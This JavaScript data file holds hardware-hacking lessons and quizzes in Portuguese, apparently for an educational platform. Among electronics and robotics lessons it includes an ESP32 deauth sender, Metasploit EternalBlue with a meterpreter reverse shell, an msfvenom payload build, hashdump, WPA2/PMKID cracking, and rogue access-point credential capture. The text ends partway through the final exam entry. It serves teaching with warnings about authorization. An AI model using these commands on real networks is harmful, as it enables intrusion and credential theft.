const LEAO_LICOES = [
  { id:'l1', titulo:'Eletrônica básica para hacking', xp:130,
    teoria:`<h3>🦁 Rex diz:</h3><p>Antes de hackear hardware, você precisa entender eletrônica básica. Tudo aqui se aplica a Arduino, ESP32, Flipper e qualquer microcontrolador.</p><div class="code-example">Componentes essenciais:

Resistor    → limita corrente
LED         → indicador luminoso
Botão       → entrada digital
Multímetro  → mede tensão, corrente, resistência
Protoboard  → monta circuitos sem solda</div><div class="code-example">Lei de Ohm — fundamental:

V = I × R

V = tensão (Volts)
I = corrente (Amperes)
R = resistência (Ohms)

Ex: LED de 2V, fonte de 5V, resistor necessário?
R = (5V - 2V) / 0.02A = 150Ω</div>`,
    exemplo:`<div class="code-example"><span class="c-cm">// Níveis lógicos digitais</span>
HIGH (1) = ~3.3V ou 5V (depende da placa)
LOW  (0) = 0V

<span class="c-cm">// ESP32 trabalha em 3.3V — cuidado!</span>
<span class="c-cm">// Conectar direto 5V pode danificar o chip</span></div>`,
    exercicios:[
      {tipo:'multipla',pergunta:'Qual a tensão de operação do ESP32?',opcoes:['12V','5V','3.3V','1.5V'],correta:2,explicacao:'ESP32 opera em 3.3V. Conectar sinais de 5V diretamente nos pinos pode danificar o chip — sempre use conversores de nível quando necessário.'},
      {tipo:'multipla',pergunta:'Para que serve um resistor num circuito com LED?',opcoes:['Aumentar o brilho','Limitar a corrente e proteger o LED de queimar','Mudar a cor','Armazenar energia'],correta:1,explicacao:'LEDs sem resistor limitador recebem corrente excessiva e queimam quase instantaneamente. O resistor garante que a corrente fique dentro do limite seguro.'},
      {tipo:'completar',pergunta:'Complete a Lei de Ohm:',codigo:'V = I × ___',resposta:'R',explicacao:'Tensão = Corrente × Resistência. É a fórmula mais fundamental da eletrônica, usada para calcular qualquer componente em um circuito.'}
    ]
  },
  { id:'l2', titulo:'Arduino — primeiro código', xp:130,
    teoria:`<h3>🦁 Rex diz:</h3><p>Todo programa Arduino (sketch) tem duas funções obrigatórias: setup() roda uma vez, loop() roda infinitamente.</p><div class="code-example"><span class="c-kw">void</span> <span class="c-fn">setup</span>() {
  pinMode(<span class="c-num">13</span>, OUTPUT);  <span class="c-cm">// configura pino como saída</span>
  Serial.begin(<span class="c-num">9600</span>);    <span class="c-cm">// comunicação serial</span>
}

<span class="c-kw">void</span> <span class="c-fn">loop</span>() {
  digitalWrite(<span class="c-num">13</span>, HIGH);  <span class="c-cm">// liga LED</span>
  delay(<span class="c-num">1000</span>);             <span class="c-cm">// espera 1 segundo</span>
  digitalWrite(<span class="c-num">13</span>, LOW);   <span class="c-cm">// desliga LED</span>
  delay(<span class="c-num">1000</span>);
}
<span class="c-cm">// Isso pisca o LED embutido — o "Hello World" do hardware!</span></div>`,
    exemplo:`<div class="code-example"><span class="c-cm">// Lendo um botão</span>
<span class="c-kw">void</span> <span class="c-fn">setup</span>() {
  pinMode(<span class="c-num">2</span>, INPUT_PULLUP);
  Serial.begin(<span class="c-num">9600</span>);
}

<span class="c-kw">void</span> <span class="c-fn">loop</span>() {
  <span class="c-kw">int</span> estado = digitalRead(<span class="c-num">2</span>);
  <span class="c-kw">if</span> (estado == LOW) {  <span class="c-cm">// botão pressionado</span>
    Serial.println(<span class="c-str">"Botão pressionado!"</span>);
  }
}</div>`,
    exercicios:[
      {tipo:'multipla',pergunta:'O que a função loop() faz no Arduino?',opcoes:['Roda uma única vez','Roda continuamente, em loop infinito, após o setup','Configura pinos','Para o programa'],correta:1,explicacao:'loop() executa repetidamente enquanto o Arduino estiver ligado. É onde fica a lógica principal que precisa rodar continuamente.'},
      {tipo:'multipla',pergunta:'O que pinMode(13, OUTPUT) faz?',opcoes:['Lê um valor do pino 13','Configura o pino 13 para enviar sinal (saída)','Desliga o pino','Cria uma variável'],correta:1,explicacao:'pinMode configura se um pino vai RECEBER sinal (INPUT) ou ENVIAR sinal (OUTPUT). É sempre feito no setup() antes de usar o pino.'},
      {tipo:'completar',pergunta:'Complete para esperar 500 milissegundos:',codigo:'___(500);',resposta:'delay',explicacao:'delay(ms) pausa a execução pelo tempo especificado em milissegundos. delay(1000) = 1 segundo de pausa.'}
    ]
  },
  { id:'l3', titulo:'ESP32 — WiFi e conectividade', xp:140,
    teoria:`<h3>🦁 Rex diz:</h3><p>O ESP32 tem WiFi e Bluetooth integrados — isso o torna a base de quase todo projeto de hacking de hardware que envolve rede.</p><div class="code-example"><span class="c-cm">#include &lt;WiFi.h&gt;</span>

<span class="c-kw">void</span> <span class="c-fn">setup</span>() {
  Serial.begin(<span class="c-num">115200</span>);
  WiFi.begin(<span class="c-str">"SSID"</span>, <span class="c-str">"senha"</span>);

  <span class="c-kw">while</span> (WiFi.status() != WL_CONNECTED) {
    delay(<span class="c-num">500</span>);
    Serial.print(<span class="c-str">"."</span>);
  }
  Serial.println(<span class="c-str">"Conectado!"</span>);
  Serial.println(WiFi.localIP());
}</div><div class="code-example"><span class="c-cm">// Modo Access Point — ESP32 vira roteador</span>
WiFi.softAP(<span class="c-str">"ESP32-Hotspot"</span>, <span class="c-str">"senha123"</span>);
Serial.println(WiFi.softAPIP());
<span class="c-cm">// Outros dispositivos podem conectar nele!</span></div>`,
    exemplo:`<div class="code-example"><span class="c-cm">// Scanear redes WiFi próximas</span>
<span class="c-kw">int</span> n = WiFi.scanNetworks();
<span class="c-kw">for</span> (<span class="c-kw">int</span> i = <span class="c-num">0</span>; i &lt; n; i++) {
  Serial.println(WiFi.SSID(i));
  Serial.println(WiFi.RSSI(i)); <span class="c-cm">// força do sinal</span>
}</div>`,
    exercicios:[
      {tipo:'multipla',pergunta:'O que WiFi.softAP() faz no ESP32?',opcoes:['Conecta a uma rede existente','Transforma o ESP32 em um ponto de acesso (roteador)','Desliga o WiFi','Escaneia redes'],correta:1,explicacao:'softAP (soft Access Point) faz o ESP32 criar sua própria rede WiFi, que outros dispositivos podem encontrar e conectar — base de ataques Evil Twin.'},
      {tipo:'multipla',pergunta:'O que RSSI mede em WiFi?',opcoes:['Velocidade da rede','Força do sinal recebido','Número de dispositivos conectados','Tipo de criptografia'],correta:1,explicacao:'RSSI (Received Signal Strength Indicator) mede a intensidade do sinal — valores mais próximos de 0 (ex: -30) são mais fortes que valores distantes (ex: -90).'},
      {tipo:'completar',pergunta:'Complete para escanear redes WiFi disponíveis:',codigo:'int n = WiFi.___()',resposta:'scanNetworks',explicacao:'scanNetworks() retorna o número de redes encontradas. Depois você usa WiFi.SSID(i) e WiFi.RSSI(i) para detalhes de cada uma.'}
    ]
  },
  { id:'l4', titulo:'Protocolo 802.11 e Deauth Attack', xp:150,
    teoria:`<h3>🦁 Rex diz:</h3><p>Entender o protocolo WiFi (802.11) por dentro é essencial para qualquer ferramenta de segurança WiFi — incluindo as que você vai construir.</p><div class="code-example">Frames de gerenciamento WiFi:

Beacon       → AP anuncia sua existência
Probe Request → cliente procura redes
Authentication → handshake de autenticação
Deauthentication → desconecta um cliente</div><p><strong>Deauth attack:</strong> o frame de desautenticação NÃO é criptografado nem autenticado no WiFi tradicional — qualquer um pode forjar um e desconectar outros clientes.</p><div class="code-example"><span class="c-cm">// Conceito do pacote deauth (simplificado)</span>
Frame: [tipo=deauth, BSSID=AP, destino=cliente_alvo]
<span class="c-cm">// O cliente recebe e se desconecta, achando que</span>
<span class="c-cm">// foi o próprio AP que pediu</span></div><p>⚠️ Deauth attacks só devem ser feitos em redes próprias ou com autorização explícita — é ilegal em redes de terceiros sem permissão.</p>`,
    exemplo:`<div class="code-example"><span class="c-cm">// Estrutura básica do ESP32 Deauther (conceitual)</span>
<span class="c-kw">void</span> <span class="c-fn">enviarDeauth</span>(uint8_t* bssid, uint8_t* cliente) {
  uint8_t pacote[<span class="c-num">26</span>] = {
    <span class="c-num">0xC0</span>, <span class="c-num">0x00</span>,  <span class="c-cm">// tipo: deauth</span>
    <span class="c-num">0x00</span>, <span class="c-num">0x00</span>,  <span class="c-cm">// duração</span>
    <span class="c-cm">// ... endereços MAC do cliente e AP</span>
    <span class="c-num">0x07</span>, <span class="c-num">0x00</span>   <span class="c-cm">// razão: class 3</span>
  };
  esp_wifi_80211_tx(WIFI_IF_STA, pacote, <span class="c-kw">sizeof</span>(pacote), <span class="c-kw">false</span>);
}</div>`,
    exercicios:[
      {tipo:'multipla',pergunta:'Por que o deauth attack funciona no WiFi tradicional?',opcoes:['É criptografado mas fraco','O frame de desautenticação não é autenticado, pode ser forjado','Precisa de senha','Só funciona em redes abertas'],correta:1,explicacao:'O protocolo 802.11 original não autentica frames de gerenciamento (incluindo deauth) — qualquer dispositivo pode enviar um forjado se conhecer os endereços MAC envolvidos.'},
      {tipo:'multipla',pergunta:'O que é um Beacon frame no WiFi?',opcoes:['Pedido de desconexão','Frame que o AP envia periodicamente anunciando sua rede','Senha da rede','Tipo de criptografia'],correta:1,explicacao:'Beacons são enviados constantemente pelo AP (~10x por segundo) anunciando SSID, capacidades e parâmetros da rede — é como o AP "dizer" que existe.'},
      {tipo:'completar',pergunta:'Complete: o WPA3 corrigiu a vulnerabilidade do deauth usando frames de gerenciamento ___:',codigo:'WPA3 usa frames de gerenciamento ___ (Protected Management Frames)',resposta:'protegidos',explicacao:'PMF (Protected Management Frames) no WPA3 autentica frames de deauth/disassoc, tornando o ataque clássico ineficaz em redes modernas bem configuradas.'}
    ]
  },
  { id:'l5', titulo:'M5StickC e M5Shark', xp:150,
    teoria:`<h3>🦁 Rex diz:</h3><p>O M5StickC é um ESP32 compacto com tela, botões e bateria — perfeito para ferramentas portáteis. M5Shark é um conjunto de apps de auditoria WiFi para ele.</p><div class="code-example">Hardware do M5StickC:
- Chip: ESP32
- Tela: 0.96" TFT colorida
- Botões: A, B e Power
- IMU: acelerômetro/giroscópio
- Bateria: 95mAh recarregável</div><div class="code-example"><span class="c-cm">// Programando o M5StickC com a biblioteca M5</span>
<span class="c-cm">#include &lt;M5StickC.h&gt;</span>

<span class="c-kw">void</span> <span class="c-fn">setup</span>() {
  M5.begin();
  M5.Lcd.setRotation(<span class="c-num">3</span>);
  M5.Lcd.println(<span class="c-str">"CodeWisdom!"</span>);
}

<span class="c-kw">void</span> <span class="c-fn">loop</span>() {
  <span class="c-kw">if</span> (M5.BtnA.wasPressed()) {
    M5.Lcd.println(<span class="c-str">"Botão A!"</span>);
  }
  M5.update(); <span class="c-cm">// sempre no loop!</span>
}</div>`,
    exemplo:`<div class="code-example"><span class="c-cm">// App de WiFi Scanner no M5Shark (conceitual)</span>
<span class="c-kw">void</span> <span class="c-fn">scanEExibir</span>() {
  <span class="c-kw">int</span> redes = WiFi.scanNetworks();
  M5.Lcd.fillScreen(BLACK);
  <span class="c-kw">for</span> (<span class="c-kw">int</span> i = <span class="c-num">0</span>; i &lt; redes && i &lt; <span class="c-num">5</span>; i++) {
    M5.Lcd.println(WiFi.SSID(i) + <span class="c-str">" "</span> + WiFi.RSSI(i));
  }
}</div>`,
    exercicios:[
      {tipo:'multipla',pergunta:'Qual chip está por trás do M5StickC?',opcoes:['Arduino Uno','ESP32','Raspberry Pi','STM32'],correta:1,explicacao:'O M5StickC usa o mesmo chip ESP32 que você já programou — só que num formato compacto com tela e bateria integrados, ideal para ferramentas portáteis.'},
      {tipo:'multipla',pergunta:'O que M5.update() faz e por que é importante?',opcoes:['Atualiza o firmware','Atualiza o estado dos botões — deve ser chamado a cada loop','Conecta ao WiFi','Desliga o dispositivo'],correta:1,explicacao:'M5.update() processa o estado atual dos botões (pressionado, solto). Sem chamá-lo no loop, wasPressed() nunca detectará cliques.'},
      {tipo:'completar',pergunta:'Complete para inicializar a biblioteca M5 no setup:',codigo:'void setup() {\n  M5.___();\n}',resposta:'begin',explicacao:'M5.begin() inicializa todo o hardware do M5StickC — tela, botões, energia. É sempre a primeira linha do setup().'}
    ]
  },
  { id:'l6', titulo:'Flipper Zero — sub-GHz e RFID', xp:160,
    teoria:`<h3>🦁 Rex diz:</h3><p>O Flipper Zero é o "canivete suíço" do hacker de hardware — sub-GHz, RFID/NFC, infravermelho, BadUSB, tudo num dispositivo.</p><div class="code-example">Frequências sub-GHz comuns:

315 MHz → controles remotos (EUA)
433 MHz → portões, alarmes (mundial)
868 MHz → Europa (LoRa, sensores)
915 MHz → EUA (LoRa, IoT)</div><div class="code-example">RFID 125kHz (cartões antigos):
- Sem criptografia
- Fácil leitura e clonagem
- Usado em controle de acesso simples

NFC 13.56MHz (cartões modernos):
- Pode ter criptografia (MIFARE)
- Cartões de transporte, pagamento
- Clonagem depende do nível de proteção</div>`,
    exemplo:`<div class="code-example"><span class="c-cm">// Fluxo de captura e replay sub-GHz</span>
1. Flipper escuta a frequência (ex: 433.92 MHz)
2. Usuário aciona o controle remoto original
3. Flipper captura o sinal (frequência, modulação, dados)
4. Flipper salva o sinal
5. Mais tarde: Flipper retransmite o sinal salvo
6. Portão/alarme reage como se fosse o controle original</div>`,
    exercicios:[
      {tipo:'multipla',pergunta:'Por que RFID 125kHz é fácil de clonar?',opcoes:['Tem criptografia forte','Não tem criptografia — transmite o ID diretamente','É muito caro','Não existe mais'],correta:1,explicacao:'RFID 125kHz (cartões antigos de controle de acesso) transmite o identificador sem nenhuma proteção criptográfica, permitindo leitura e clonagem trivial.'},
      {tipo:'multipla',pergunta:'Qual frequência sub-GHz é mais usada para portões no Brasil?',opcoes:['2.4 GHz','433 MHz','5 GHz','60 GHz'],correta:1,explicacao:'433 MHz é a frequência sub-GHz mais comum mundialmente para controles de portão, alarmes residenciais e dispositivos IoT simples.'},
      {tipo:'completar',pergunta:'Complete o tipo de cartão que PODE ter criptografia (diferente do RFID 125kHz):',codigo:'Cartões ___ de 13.56MHz podem usar criptografia MIFARE',resposta:'NFC',explicacao:'NFC opera em 13.56MHz e os cartões MIFARE Classic/DESFire podem implementar criptografia — mais seguros que RFID 125kHz, mas MIFARE Classic ainda tem vulnerabilidades conhecidas.'}
    ]
  },
  { id:'l7', titulo:'HackRF e Software Defined Radio', xp:160,
    teoria:`<h3>🦁 Rex diz:</h3><p>SDR (Software Defined Radio) permite que software processe sinais de rádio de qualquer frequência — extremamente versátil.</p><div class="code-example">RTL-SDR (entrada, ~R$150):
- Recepção apenas
- 24MHz a 1.7GHz
- Ótimo para começar: FM, ADS-B, sensores

HackRF One (avançado, ~R$800):
- Transmissão E recepção
- 1MHz a 6GHz
- Permite replay attacks, jamming</div><div class="code-example"><span class="c-cm"># GNU Radio Companion — fluxo de processamento</span>
RTL-SDR Source → 
  Low Pass Filter →
    FM Demodulator →
      Audio Sink

<span class="c-cm"># Cada bloco processa o sinal e passa adiante</span></div>`,
    exemplo:`<div class="code-example"><span class="c-cm"># Rastrear aviões com ADS-B (1090MHz)</span>
rtl_adsb | dump1090 --raw

<span class="c-cm"># Decodificar sinais meteorológicos NOAA</span>
rtl_fm -f 137.620M | multimon-ng -a APT -</div>`,
    exercicios:[
      {tipo:'multipla',pergunta:'Qual a diferença entre RTL-SDR e HackRF?',opcoes:['São idênticos','RTL-SDR só recebe, HackRF transmite e recebe','HackRF é mais barato','RTL-SDR é mais avançado'],correta:1,explicacao:'RTL-SDR é um dispositivo de recepção apenas, ótimo para iniciar. HackRF One pode transmitir também, permitindo replay attacks e experimentação mais avançada.'},
      {tipo:'multipla',pergunta:'O que ADS-B permite rastrear?',opcoes:['Carros','Aviões em tempo real','Navios','Satélites'],correta:1,explicacao:'ADS-B (Automatic Dependent Surveillance-Broadcast) é o sistema que aviões usam para transmitir posição, altitude e velocidade em 1090MHz — captável com SDR barato.'},
      {tipo:'completar',pergunta:'Complete a faixa de frequência do HackRF One:',codigo:'HackRF One opera de 1MHz a ___GHz',resposta:'6',explicacao:'HackRF cobre de 1MHz até 6GHz — uma faixa enorme que inclui WiFi, Bluetooth, GSM, FM, e muito mais, tudo no mesmo dispositivo.'}
    ]
  },
  { id:'l8', titulo:'Raspberry Pi para pentest', xp:160,
    teoria:`<h3>🦁 Rex diz:</h3><p>Raspberry Pi com Kali Linux vira uma ferramenta de pentest portátil completa — pequena o suficiente para "esquecer" numa rede física.</p><div class="code-example"># Instalar Kali Linux ARM no Raspberry Pi
1. Baixar imagem Kali ARM oficial
2. Gravar no cartão SD (Raspberry Pi Imager)
3. Configurar SSH headless (sem monitor)
4. Boot e conectar via SSH

# Configuração headless
touch /boot/ssh  # ativa SSH sem precisar de tela</div><div class="code-example"># Pi como rogue Access Point
apt install hostapd dnsmasq
# Configurar hostapd.conf com SSID falso
# Capturar credenciais de quem conectar (com autorização!)</div>`,
    exemplo:`<div class="code-example"># Pi "drop box" — implantado em rede física
1. Conecta na rede via ethernet (disfarçado)
2. Estabelece conexão reversa (VPN/SSH) para fora
3. Pentester acessa remotamente de qualquer lugar
4. Realiza testes na rede interna sem estar fisicamente lá

# SEMPRE com autorização explícita do dono da rede!</div>`,
    exercicios:[
      {tipo:'multipla',pergunta:'O que significa configuração "headless" no Raspberry Pi?',opcoes:['Sem CPU','Sem monitor — acesso só via rede (SSH)','Sem WiFi','Sem armazenamento'],correta:1,explicacao:'Headless significa operar sem monitor/teclado conectados diretamente — você acessa via SSH pela rede, essencial para dispositivos implantados discretamente.'},
      {tipo:'multipla',pergunta:'O que um "drop box" de pentest faz?',opcoes:['Armazena arquivos na nuvem','Pequeno dispositivo implantado numa rede física que permite acesso remoto para testes','Bloqueia acessos','Detecta vírus'],correta:1,explicacao:'Drop box é um Raspberry Pi ou similar conectado fisicamente numa rede-alvo (com autorização), permitindo ao pentester testar a rede interna remotamente.'},
      {tipo:'completar',pergunta:'Complete o arquivo que ativa SSH no boot do Raspberry Pi sem tela:',codigo:'touch /boot/___',resposta:'ssh',explicacao:'Criar um arquivo vazio chamado "ssh" na partição boot ativa o serviço SSH automaticamente no primeiro boot — essencial para configuração headless.'}
    ]
  },
  { id:'l9', titulo:'BadUSB e ataques HID', xp:170,
    teoria:`<h3>🦁 Rex diz:</h3><p>BadUSB explora a confiança que computadores têm em dispositivos USB — um pendrive pode se disfarçar de teclado e digitar comandos sozinho.</p><div class="code-example">Como funciona HID injection:

1. Dispositivo se identifica como "teclado USB" (HID)
2. Sistema operacional confia automaticamente
3. Dispositivo "digita" comandos pré-programados
4. Em segundos, executa scripts maliciosos

# Tudo acontece mais rápido que humanamente possível</div><div class="code-example"># Ducky Script — linguagem do Rubber Ducky
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING echo "Executado!"
ENTER</div>`,
    exemplo:`<div class="code-example">// DigiSpark (ATtiny85) como BadUSB DIY — Arduino IDE
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.println("echo BadUSB funcionando");
}

void loop() {}</div>`,
    exercicios:[
      {tipo:'multipla',pergunta:'Por que BadUSB funciona mesmo com antivírus instalado?',opcoes:['Antivírus está desatualizado','O dispositivo se disfarça de teclado, ação que o SO confia por padrão','É invisível ao sistema','Precisa de root'],correta:1,explicacao:'O sistema operacional confia em entradas de teclado por padrão — não há como o antivírus diferenciar entre "humano digitando" e "BadUSB digitando" automaticamente.'},
      {tipo:'multipla',pergunta:'O que é Ducky Script?',opcoes:['Um vírus','Linguagem simples para programar payloads de HID injection no Rubber Ducky','Sistema operacional','Protocolo de rede'],correta:1,explicacao:'Ducky Script usa comandos simples (STRING, ENTER, DELAY, GUI) para descrever sequências de "digitação" que o dispositivo BadUSB executa automaticamente.'},
      {tipo:'completar',pergunta:'Complete o comando Ducky Script para "digitar" um texto:',codigo:'___ echo "teste"',resposta:'STRING',explicacao:'STRING faz o dispositivo digitar o texto especificado, caractere por caractere, simulando digitação real de teclado.'}
    ]
  },
  { id:'l10', titulo:'Metasploit Framework', xp:170,
    teoria:`<h3>🦁 Rex diz:</h3><p>Metasploit é o framework de exploração mais usado em pentest profissional — organiza exploits, payloads e pós-exploração.</p><div class="code-example"># Iniciar o Metasploit
msfconsole

# Buscar exploit para um serviço
search type:exploit smb

# Selecionar e configurar
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit</div><div class="code-example"># Meterpreter — pós-exploração
sysinfo          # informações do sistema
getuid           # usuário atual
hashdump         # extrair hashes de senha
screenshot       # capturar tela
download arquivo # baixar arquivo da vítima</div>`,
    exemplo:`<div class="code-example"># Gerar payload customizado
msfvenom -p windows/meterpreter/reverse_tcp \\
  LHOST=192.168.1.10 LPORT=4444 \\
  -f exe -o payload.exe

# Listener para receber conexão
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
exploit</div>`,
    exercicios:[
      {tipo:'multipla',pergunta:'O que é um "payload" no Metasploit?',opcoes:['O alvo do ataque','O código que executa após a exploração bem-sucedida','Um tipo de vírus','A senha do sistema'],correta:1,explicacao:'Payload é o código que roda DEPOIS que o exploit consegue acesso — pode ser um shell reverso, meterpreter, ou qualquer ação a ser executada na máquina comprometida.'},
      {tipo:'multipla',pergunta:'O que Meterpreter permite fazer após comprometer um sistema?',opcoes:['Só ver a tela','Diversas ações pós-exploração: extrair senhas, navegar arquivos, capturar tela, manter acesso','Apenas desligar o sistema','Nada além do exploit inicial'],correta:1,explicacao:'Meterpreter é um payload avançado que oferece um shell interativo poderoso para pós-exploração — coleta de informações, movimentação lateral, persistência.'},
      {tipo:'completar',pergunta:'Complete o comando Meterpreter para extrair hashes de senha:',codigo:'meterpreter > ___',resposta:'hashdump',explicacao:'hashdump extrai os hashes de senha do SAM (Windows) ou /etc/shadow (Linux), que depois podem ser quebrados offline com Hashcat ou John the Ripper.'}
    ]
  },
  { id:'l11', titulo:'WPA2 cracking e PMKID', xp:180,
    teoria:`<h3>🦁 Rex diz:</h3><p>Auditoria de redes WPA2 é uma habilidade essencial de pentest wireless — sempre em redes próprias ou autorizadas.</p><div class="code-example"># Capturar handshake WPA2
airmon-ng start wlan0          # modo monitor
airodump-ng wlan0mon           # listar redes
airodump-ng -c 6 --bssid AA:BB:CC --write captura wlan0mon
aireplay-ng --deauth 5 -a AA:BB:CC wlan0mon  # força reconexão

# Crackear com wordlist
aircrack-ng captura.cap -w wordlist.txt</div><div class="code-example"># PMKID attack — não precisa de cliente conectado!
hcxdumptool -i wlan0mon -o captura.pcapng
hcxpcapngtool captura.pcapng -o hash.22000
hashcat -m 22000 hash.22000 wordlist.txt</div>`,
    exemplo:`<div class="code-example"># Por que PMKID é mais eficiente?

Handshake tradicional:
- Precisa de cliente conectado
- Precisa forçar desconexão (deauth)
- Pode falhar se não capturar o momento certo

PMKID:
- Captura direto do AP
- Não precisa de cliente conectado
- Mais rápido e discreto</div>`,
    exercicios:[
      {tipo:'multipla',pergunta:'Por que o PMKID attack é considerado mais eficiente que o handshake tradicional?',opcoes:['É mais lento','Não precisa de um cliente conectado nem de deauth attack','Funciona só em WEP','Precisa de mais equipamento'],correta:1,explicacao:'PMKID é obtido diretamente do AP, sem necessidade de capturar um handshake completo de 4 vias com um cliente conectado — simplifica e acelera o processo.'},
      {tipo:'multipla',pergunta:'Para que serve o comando airodump-ng?',opcoes:['Crackear senhas','Capturar pacotes WiFi e listar redes próximas','Criar redes falsas','Instalar drivers'],correta:1,explicacao:'airodump-ng captura tráfego wireless e mostra informações de redes próximas — BSSID, canal, criptografia, clientes conectados.'},
      {tipo:'completar',pergunta:'Complete a ferramenta usada para quebrar hashes WPA2 com GPU:',codigo:'___ -m 22000 hash.22000 wordlist.txt',resposta:'hashcat',explicacao:'Hashcat usa aceleração por GPU para testar senhas muito mais rápido que ferramentas baseadas em CPU. O modo 22000 é específico para hashes WPA-PBKDF2-PMKID+EAPOL.'}
    ]
  },
  { id:'l12', titulo:'Análise de firmware e JTAG', xp:180,
    teoria:`<h3>🦁 Rex diz:</h3><p>Analisar o firmware de um dispositivo IoT revela vulnerabilidades, senhas hardcoded e a lógica interna do hardware.</p><div class="code-example"># Extrair e analisar firmware
binwalk firmware.bin              # identifica estrutura
binwalk -e firmware.bin           # extrai sistema de arquivos
strings firmware.bin | grep -i pass  # buscar senhas hardcoded

# Procurar por arquitetura
file firmware.bin
binwalk -A firmware.bin           # detecta arquitetura de CPU</div><div class="code-example"># JTAG — debug a nível de hardware
openocd -f interface/jlink.cfg -f target/esp32.cfg

# Conectar com GDB
gdb -ex "target remote localhost:3333"
# Permite pausar execução, ver registradores, memória</div>`,
    exemplo:`<div class="code-example"># Fluxo comum de análise de firmware

1. Obter firmware (download, dump físico via SPI/JTAG)
2. binwalk para identificar sistema de arquivos
3. Extrair e explorar arquivos (configs, scripts)
4. Buscar credenciais hardcoded, chaves de API
5. Analisar binários executáveis com Ghidra/IDA
6. Identificar vulnerabilidades conhecidas (CVEs)</div>`,
    exercicios:[
      {tipo:'multipla',pergunta:'Para que serve o Binwalk?',opcoes:['Criar firmware','Identificar e extrair conteúdo embutido em arquivos de firmware','Compilar código','Conectar ao WiFi'],correta:1,explicacao:'Binwalk analisa arquivos binários de firmware procurando assinaturas conhecidas (sistemas de arquivos, compressões, certificados) e pode extrair tudo automaticamente.'},
      {tipo:'multipla',pergunta:'O que JTAG permite fazer num chip?',opcoes:['Conectar à internet','Debug a nível de hardware — pausar execução, ler memória e registradores','Aumentar a velocidade','Trocar a bateria'],correta:1,explicacao:'JTAG é uma interface de debug de baixo nível presente em muitos chips, permitindo controle total sobre a execução para desenvolvimento e análise de segurança.'},
      {tipo:'completar',pergunta:'Complete o comando para buscar a palavra "password" dentro do firmware:',codigo:'strings firmware.bin | ___ -i pass',resposta:'grep',explicacao:'grep filtra linhas que contêm o padrão buscado. -i ignora maiúsculas/minúsculas. Muito comum encontrar credenciais hardcoded dessa forma.'}
    ]
  },
  { id:'l13', titulo:'Robótica — motores e controle PID', xp:180,
    teoria:`<h3>🦁 Rex diz:</h3><p>Controlar motores com precisão é a base de qualquer robô. PID é o algoritmo de controle mais usado na indústria.</p><div class="code-example">// Controle PWM de motor DC
analogWrite(PINO_MOTOR, 128);  // 0-255, velocidade

// Servo motor — posição precisa (0-180°)
#include &lt;Servo.h&gt;
Servo meuServo;
meuServo.attach(9);
meuServo.write(90);  // centro</div><div class="code-example">// PID simplificado — corrige erro continuamente
float erro = setpoint - valorAtual;
float P = erro * Kp;
integral += erro;
float I = integral * Ki;
float derivada = (erro - erroAnterior) / dt;
float D = derivada * Kd;

float saida = P + I + D;
erroAnterior = erro;</div>`,
    exemplo:`<div class="code-example">// Robô seguidor de linha com PID simplificado
int erro = sensorEsquerdo - sensorDireito;
int correcao = erro * Kp;

motorEsquerdo(velocidadeBase - correcao);
motorDireito(velocidadeBase + correcao);
// Mantém o robô centralizado na linha</div>`,
    exercicios:[
      {tipo:'multipla',pergunta:'O que as letras P, I, D significam num controlador PID?',opcoes:['Power, Input, Data','Proporcional, Integral, Derivativo','Position, Indicator, Display','Programa, Instrução, Dispositivo'],correta:1,explicacao:'P reage ao erro atual, I acumula erros passados (corrige desvios persistentes), D prevê tendência futura baseado na taxa de mudança. Juntos dão controle suave e preciso.'},
      {tipo:'multipla',pergunta:'Qual a diferença entre controlar um motor DC e um servo?',opcoes:['São idênticos','Motor DC controla velocidade/direção, servo controla posição angular precisa','Servo é mais rápido','Motor DC não usa PWM'],correta:1,explicacao:'Motor DC com PWM controla velocidade (girando continuamente). Servo motor tem feedback interno e vai para uma posição angular específica (0-180°) e fica lá.'},
      {tipo:'completar',pergunta:'Complete para mover um servo para a posição central:',codigo:'meuServo.___(90);',resposta:'write',explicacao:'write(angulo) move o servo para a posição especificada em graus (0-180). 90° é tipicamente a posição central.'}
    ]
  },
  { id:'l14', titulo:'Open source e contribuição', xp:190,
    teoria:`<h3>🦁 Rex diz:</h3><p>Contribuir com projetos open source acelera seu aprendizado, constrói portfólio real e conecta você com a comunidade global de devs.</p><div class="code-example"># Fluxo de contribuição open source

1. Fork do repositório no GitHub
2. Clone local: git clone seu-fork
3. Cria branch: git checkout -b minha-feature
4. Faz a mudança e testa
5. Commit: git commit -m "feat: adiciona X"
6. Push: git push origin minha-feature
7. Abre Pull Request no projeto original
8. Aguarda code review da comunidade</div><div class="code-example"># Boas práticas em PRs open source
- Leia CONTRIBUTING.md do projeto primeiro
- Issues marcadas "good first issue" são ótimas para começar
- PRs pequenos e focados são mais fáceis de revisar
- Sempre adicione testes para o que você mudou
- Seja paciente e receptivo ao feedback</div>`,
    exemplo:`<div class="code-example"># Empreendedorismo técnico — do código ao produto

1. Identifique um problema real (como você fez com o JBRETAS)
2. Construa um MVP funcional
3. Valide com usuários reais
4. Itere baseado em feedback
5. Considere monetização se fizer sentido
6. Documente e, se possível, abra parte como open source</div>`,
    exercicios:[
      {tipo:'multipla',pergunta:'O que significa "fork" de um repositório?',opcoes:['Deletar o repositório','Criar sua própria cópia do repositório para trabalhar livremente','Fazer backup','Renomear o projeto'],correta:1,explicacao:'Fork cria uma cópia completa do repositório na sua conta GitHub, onde você pode fazer mudanças sem afetar o projeto original até abrir um Pull Request.'},
      {tipo:'multipla',pergunta:'O que é uma issue marcada "good first issue"?',opcoes:['Issue urgente','Issue simples, recomendada para novos contribuidores aprenderem o projeto','Issue resolvida','Bug crítico'],correta:1,explicacao:'Mantenedores marcam issues simples e bem documentadas como "good first issue" especificamente para ajudar iniciantes a darem sua primeira contribuição com sucesso.'},
      {tipo:'completar',pergunta:'Complete o comando para criar uma nova branch:',codigo:'git checkout -___ minha-feature',resposta:'b',explicacao:'git checkout -b nome cria E muda para uma nova branch em um comando só. Sem o -b, checkout apenas mudaria para uma branch já existente.'}
    ]
  },
  { id:'l15', titulo:'Prova Final — Rex, o Leão', xp:300, tipo:'prova',
